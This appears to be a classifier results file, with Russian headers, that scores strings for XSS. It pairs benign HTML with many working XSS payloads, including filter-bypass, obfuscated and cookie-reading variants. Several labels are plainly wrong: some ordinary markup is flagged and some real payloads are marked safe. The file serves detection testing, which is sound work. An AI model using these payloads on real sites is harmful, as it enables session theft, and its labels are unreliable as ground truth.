Входная строка;XSS;Вероятность;Риск
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<svg@load=this.alert(1)>;True;66.67%;HIGH
<svg on =i onload=alert(domain) (working);True;99.38%;CRITICAL
<span class='class-674'>Services</span>;False;1.13%;SAFE
"â€œ><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;";True;87.26%;CRITICAL
"""><svg+onload=alert&amp;#x42""1";True;99.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"<img src=x onerror=""alert(origin)"">";True;99.73%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<details/open/ontoggle=alert()>;True;99.20%;CRITICAL
"<noscript><p title=""</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>"">";True;77.91%;HIGH
<input type='text' name='field'>;False;29.42%;LOW
"123')});alert(1);(()=>{('";True;94.03%;CRITICAL
<span class='class-504'>Services</span>;False;1.13%;SAFE
<script>prompt(document.domain)</script>;True;67.18%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<a+href=""javas&#99;ript&#35;alert(1);"">";True;57.12%;MEDIUM
"""><svg+onload=alert&amp;#x83""1";True;99.49%;CRITICAL
"<a href=javascript&colon;confirm(1)>";False;3.19%;SAFE
"<a+HREF=""%26%237 javascrip%26%239t: alert%261par;document .domain) *>";True;67.62%;HIGH
<html ontouchmove=alert(1)>;True;99.68%;CRITICAL
"1'""();<test><ScRiPt>window.alert(""XSS_WAF_BYPASS"")</ScRiPt>";True;84.55%;CRITICAL
'%26%26'javascript:alert%25281%2529//;True;95.86%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
"tarun""><x/onafterscriptexecute=confirm%26lpar;)//";True;77.49%;HIGH
""";a=prompt,a()//";True;66.31%;HIGH
"&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;";True;92.60%;CRITICAL
top[â€˜al\x65rtâ€™](1);True;55.55%;MEDIUM
"""><svg+onload=alert&amp;#x5E""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<svg/onload='+/""`/+/onmouseover=1/+/[*/[]/+alert(42);//'>";True;99.24%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"a=8,b=confirm,c=window,c.onerror=b;throw-a";True;72.18%;HIGH
<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>;True;40.33%;MEDIUM
<scr<object>ipt>alert(1)</script>;True;90.89%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h6>Login</h6>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%3F%20<script>prompt(document.domain)</script>;True;69.40%;HIGH
<span class='class-1414'>Services</span>;False;1.13%;SAFE
<script>prompt(1234)</script>;True;49.01%;MEDIUM
"â€/>&_lt;_script>alert(1)&_lt;/scr_ipt>â€/>";True;92.60%;CRITICAL
javascript://%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS');True;63.17%;HIGH
<span class='class-514'>Services</span>;False;1.13%;SAFE
<img language=vbs src=<b onerror=confirm#1/1#>;True;93.89%;CRITICAL
"<img/src=a onerror=""window['alert'](document.cookie)""/>";True;98.14%;CRITICAL
"""'`><script>log*chr*(*num*)</script>";True;59.38%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
foo%00<script>alert(document.cookie)</script>;True;78.97%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"""><svg+onload=alert&amp;#x1F""1";True;99.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"`-alert(1)"">'onload=""`<svg/1='";True;99.61%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<h6>Login</h6>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<a/href=&#74;ava%0a%0d%09script&colon;alert()>click";True;75.64%;HIGH
javascript:\\\/\\\/%250Aalert(1);True;95.57%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div""> -@AldenAous";True;99.17%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"<IMG SRC= onmouseover=""alert('xxs')"">";True;99.75%;CRITICAL
<span class='class-204'>Services</span>;False;1.13%;SAFE
<body language=vbs onload=confirm-1;True;80.14%;CRITICAL
aaaaa\â€-confirm`1`//;True;56.19%;MEDIUM
<style onreadystatechange=alert(1)>;True;99.63%;CRITICAL
"""><svg+onload=alert&amp;#x80""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""-eval(""window['pro'%2B'mpt'](8)"")-""";True;63.03%;HIGH
"<a""/onclick=(confirm)()>Click Here!";True;68.99%;HIGH
"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;";True;92.48%;CRITICAL
"""><img src=1 onerror=alert(1)>.gif";True;99.69%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"<noscript><img title=""</noscript><img src onerror=alert(1)>""></noscript>";True;99.62%;CRITICAL
"jaVasCript:\\\\\\\/*-\\\\\\\/*`\\\\\\\/*\\\\\\\\`\\\\\\\/*\\\\\\\'\\\\\\\/*\\\\\\\""\\\\\\\/**\\\\\\\/(\\\\\\\/* *\\\\\\\/oNcliCk=alert() )\\\\\\\/\\\\\\\/%0D%0A%0D%0A\\\\\\\/\\\\\\\/<\\\\\\\/stYle\\\\\\\/<\\\\\\\/titLe\\\\\\\/<\\\\\\\/teXtarEa\\\\\\\/<\\\\\\\/scRipt\\\\\\\/--!>\\\\\\\\x3csVg\\\\\\\/<sVg\\\\\\\/oNloAd=alert()\\\\\\\/\\\\\\\/>\\\\\\\\x3e";True;98.43%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p><img/src/onerror=alert(`test`)></p>;True;99.74%;CRITICAL
javascript:\\\\\\\/\\\\\\\/\\\\\\\'\\\\\\\/<\\\\\\\/title><\\\\\\\/style><\\\\\\\/textarea><\\\\\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\\\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\\\\\'Audi%20RS5\\\\\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\\\\\'XSS\\\\\\\');False;31.30%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"""&amp;amp;gt;&amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;gt;";True;98.57%;CRITICAL
<span class='class-424'>Services</span>;False;1.13%;SAFE
"&#60;script&#62;alert(1)&#60;/script&#62;";True;91.63%;CRITICAL
"<object+data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>";True;92.06%;CRITICAL
<span class='class-1214'>Services</span>;False;1.13%;SAFE
"<noframes><img title=""</noframes><img src onerror=alert(1)>""></noframes>";True;99.72%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"&amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;";True;99.71%;CRITICAL
<p>About</p>;False;34.33%;LOW
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>";True;92.74%;CRITICAL
'onfocus='alert(1)' autofocus=';True;99.28%;CRITICAL
"--></script></title></style>""/</textarea><a' onclick=alert()//>*/alert()/*";True;99.32%;CRITICAL
<a href=&#01javascript:alert(1)>;False;11.61%;SAFE
"`'"";//><Img Src=a OnError=location=src>";True;68.91%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<script%00>alert(1)</script%00>;True;85.25%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>";True;99.83%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""&gt;&lt;svg onload=alert(1)&gt;";True;99.55%;CRITICAL
<form action=javascript:alert(1)><input type=submit>;True;95.79%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<span class='class-1194'>Services</span>;False;1.13%;SAFE
"%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE%0D%0A%0D%0A<script>%0D%0Aalert(1);%0D%0A</script>";True;43.02%;MEDIUM
test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E;True;99.04%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"%3F%20""><svg onload=alert(1)>";True;99.74%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h6>Login</h6>;False;27.98%;LOW
<span class='class-604'>Services</span>;False;1.13%;SAFE
"<details open ontoggle=""alert(1)""><summary>Click me!</summary></details>";True;99.84%;CRITICAL
<span class='class-1424'>Services</span>;False;1.13%;SAFE
<span class='class-1274'>Services</span>;False;1.13%;SAFE
"/cpanelwebcall/<img src=x onerror=""prompt(1)"">aaaaaaaaaaaa";True;98.91%;CRITICAL
"pods/ppt.aspx?&fileName=')}, 1000); alert('xss')://";True;99.29%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
top[8680439..toString(30)](1);True;55.55%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<!--[if]><script>javascript:alert(1)</script-->;True;91.42%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"\""-alert(1)}//";True;87.25%;CRITICAL
"'--><img src=x onerror=prompt(document.domain);><!--";True;86.74%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"<details open id=""' &quot;'""ontoggle=alert(1)>";True;99.67%;CRITICAL
"""><svg+onload=alert&amp;#x50""1";True;99.49%;CRITICAL
onkeydown=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE";True;71.95%;HIGH
<div>Home</div>;False;25.75%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"q=""><img/src/onerror=.1|alert`` class=d>";True;99.26%;CRITICAL
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""\>";True;98.92%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<h4>Login</h4>;False;27.98%;LOW
%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A;True;87.58%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<embed src=javascript:alert(1)>;True;94.09%;CRITICAL
ï¼œscriptï¼žalert(123)ï¼œ/scriptï¼ž;True;93.66%;CRITICAL
"<IMG SRC=""jav   ascript:alert('XSS');"">";True;98.57%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a id=x tabindex=1 onfocus=alert(1)></a>;True;99.88%;CRITICAL
"';a=prompt,a()//";True;66.31%;HIGH
"""alert(document.cookie)['script'](2);""";True;92.83%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74;True;71.05%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>";True;99.32%;CRITICAL
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 104, 105, 34, 41, 59)</script>;True;40.89%;MEDIUM
"javascript:var{a:onerror}={a:alert};throw%20document.domain";True;90.81%;CRITICAL
<p>About</p>;False;34.33%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%7;True;76.17%;HIGH
"<script>eval(atob(â€˜amF2YXNjcmlwdDphbGVydCgxKQâ€™));</script>";True;62.23%;HIGH
<img src @error=e=$event.composedPath().pop().alert(1)>;True;76.40%;HIGH
<ScripT>alert(1234)</ScRipT>;True;86.52%;CRITICAL
>><marquee loop=1 width=0 onfinish=alert(1)>;True;99.45%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"');alert(document.cookie)();//";True;90.89%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<img/src/onerror=alert(`test`)>;True;99.44%;CRITICAL
"'"">><marquee><h1>1</h1></marquee>";True;53.98%;MEDIUM
<span class='class-724'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x64""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<i[%00]mg onerror=alert(1) src=a>;True;99.72%;CRITICAL
<svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>;True;89.01%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x5F""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"<object+data=""javascript:alert(0)"">";True;84.95%;CRITICAL
\'-alert(1)//;True;87.25%;CRITICAL
%0d%0a%20<img src=1 onerror=alert(1)>;True;99.78%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"%"";eval(unescape(location))//#%0Aprompt(0)";True;85.21%;CRITICAL
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>";True;98.94%;CRITICAL
"<x title""=""&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"">";True;57.76%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
""">\<img src=x onerror=prompt(document.domain);\>\;\>\<\>""";True;81.75%;CRITICAL
<img/src/onerror=prompt(8)>;True;70.81%;HIGH
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>";True;37.53%;LOW
<span class='class-854'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<img+<iframe =""1"" onerror=""alert(1)"">";True;99.83%;CRITICAL
javascript:document.body.onclick=alert(1);True;98.03%;CRITICAL
"<img src=""invalid-image"" onerror=""alert('XSS');"">";True;99.62%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x77""1";True;99.49%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
"data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==";True;98.55%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"â€&amp;amp;gt;&amp;amp;lt;svg onload=alert&amp;amp;amp;#0000000040""1"")&amp;amp;gt;";True;99.47%;CRITICAL
<span class='class-1454'>Services</span>;False;1.13%;SAFE
</script><svg/pnload=prompt(1)>;True;60.62%;HIGH
<span class='class-884'>Services</span>;False;1.13%;SAFE
<span class='class-194'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x45""1";True;99.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
<h6>Login</h6>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"Hex: <svg onload=prompt%26%23x000000028;document.domain)>";True;92.83%;CRITICAL
https://me6.com/aem/xss2.svg;True;55.17%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
"""><img src=x   onerror=prompt(document.domain);>";True;78.78%;HIGH
"<div style=""background-image:url(javascript:alert('Successful XSS'))"">";True;69.95%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">";True;86.48%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<script>â€™alert(1)â€™.replace(/.+/,eval)</script>;True;80.80%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
"<IMG onmouseover=""alert('xxs')"">";True;99.66%;CRITICAL
"""><svg+onload=alert&amp;#x4F""1";True;99.49%;CRITICAL
<svgonload=alert(1)>;True;99.26%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>";True;75.43%;HIGH
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
tagName%2BinnerHTML%2Blocation.hash%3E/*click%20me!#*/alert(document.domain);True;64.04%;HIGH
<span class='class-934'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
"<form action=""javascript:alert('XSS')"">";True;89.33%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
alert(String.fromCharCode(88))</SCRIPT>;True;70.42%;HIGH
"""<script>alert(0)</script>""@gmail.com";True;88.56%;CRITICAL
%3Cimg src='null' onerror=alert('spyerror')%3E;True;99.35%;CRITICAL
<p>About</p>;False;34.33%;LOW
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>;True;99.87%;CRITICAL
<p>About</p>;False;34.33%;LOW
"â€&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;#0000000040""1"")&amp;amp;amp;gt;";True;99.54%;CRITICAL
<p>About</p>;False;34.33%;LOW
<span class='class-24'>Services</span>;False;1.21%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e;True;85.99%;CRITICAL
"<%tag onmouseover=""alert('markitzeroday.com')"">";True;99.40%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<svg><animate onend=alert(1) attributeName=x dur=1s>;True;99.86%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<html ontouchstart=alert(1)>;True;99.68%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
""";(a=alert,b=1,a(b))";True;93.57%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><img\ src=x\ onerror=prompt(document.domain);>";True;82.49%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
"';alert(""XSS"");//";True;94.48%;CRITICAL
"'&#x3E;'>""><script>alert(2);</script>";True;94.48%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""%3balert`1`%3b""";True;83.69%;CRITICAL
<body onactivate=alert(1)>;True;99.64%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">";True;99.55%;CRITICAL
"&amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;";True;99.67%;CRITICAL
"""><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>";True;79.99%;HIGH
<span class='class-114'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<script>alert(document.domain)</script>;True;81.43%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<a/href=""j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)";False;0.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
<button autofocus onfocus=confirm(2)>;True;81.73%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<<â€‹script>script>prompt()<â€‹/script>;True;66.83%;HIGH
"<img src=x onerror=""prompt(1)"">aaaaaaaaaaaa";True;81.75%;CRITICAL
"<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>";True;88.30%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"x""><svg%0Donload=""window['alert'](document.cookie)"">";True;96.54%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>";True;99.82%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h6>Login</h6>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x34""1";True;99.49%;CRITICAL
"javascript://</title></textarea></style></script --><li '//"" '*/alert()/*', onclick=alert()//";True;99.03%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
